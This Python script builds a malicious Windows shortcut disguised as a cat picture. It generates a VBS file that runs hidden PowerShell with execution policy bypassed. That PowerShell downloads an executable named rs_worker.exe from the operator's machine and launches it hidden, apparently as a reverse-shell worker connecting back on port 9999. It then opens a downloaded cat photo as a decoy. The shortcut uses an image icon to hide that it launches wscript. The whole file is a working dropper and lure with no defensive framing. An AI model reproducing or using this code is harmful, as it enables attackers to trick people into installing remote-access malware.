import subprocess
import os
from win32com.client import Dispatch

# get master's local IP
result = subprocess.run("ipconfig | findstr IPv4", shell=True, capture_output=True, text=True)
master_ip = result.stdout.split(":")[-1].strip()
print(f"[*] Master IP: {master_ip}")

# powershell command
ps_command = (
    f"$ProgressPreference = 'SilentlyContinue';"
    f"Invoke-WebRequest -Uri 'http://{master_ip}:8080/download' -OutFile \"$env:TEMP\\rs_worker.exe\";"
    f"Start-Process \"$env:TEMP\\rs_worker.exe\" -ArgumentList '{master_ip} 9999' -WindowStyle Hidden;"
    f"Invoke-WebRequest -Uri 'https://www.cats.org.uk/media/13139/220325case013.jpg' -OutFile \"$env:TEMP\\cat.jpg\";"
    f"Start-Process \"$env:TEMP\\cat.jpg\""
)

# in VBS, quotes are doubled to escape them
ps_command_vbs = ps_command.replace('"', '""')
vbs_content = f'CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command {ps_command_vbs}", 0, False'

with open("helper.vbs", "w") as f:
    f.write(vbs_content)
print("[*] helper.vbs created.")

# create image.lnk pointing to wscript.exe with helper.vbs
vbs_path = os.path.abspath("helper.vbs")
shell = Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut("cat_image.lnk")
shortcut.TargetPath = "C:\\Windows\\System32\\wscript.exe"
shortcut.Arguments = f'"{vbs_path}"'
shortcut.IconLocation = "C:\\Windows\\System32\\imageres.dll,67"
shortcut.save()

print("[*] cat_image.lnk created successfully.")